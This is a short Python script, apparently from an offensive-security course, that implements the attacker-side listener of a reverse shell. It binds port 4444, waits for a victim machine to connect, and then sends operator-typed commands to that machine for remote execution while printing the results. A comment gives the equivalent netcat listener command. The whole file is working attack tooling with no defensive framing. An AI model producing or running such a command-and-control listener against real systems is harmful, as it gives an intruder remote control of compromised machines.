#!usr/bin/env python3

import socket


class Listener:
    def __init__(self, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # this line will reuse socket if connection dropped
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("", port))
        listener.listen(1)
        print("[+] waiting for a connection")
        self.connection, address = listener.accept()
        print("[+] got a connection from " + str(address))

    def execute_remotely(self, command):
        self.connection.send(command.encode())
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


# nc -vv -l -p 4444
my_listener = Listener(4444)
my_listener.run()
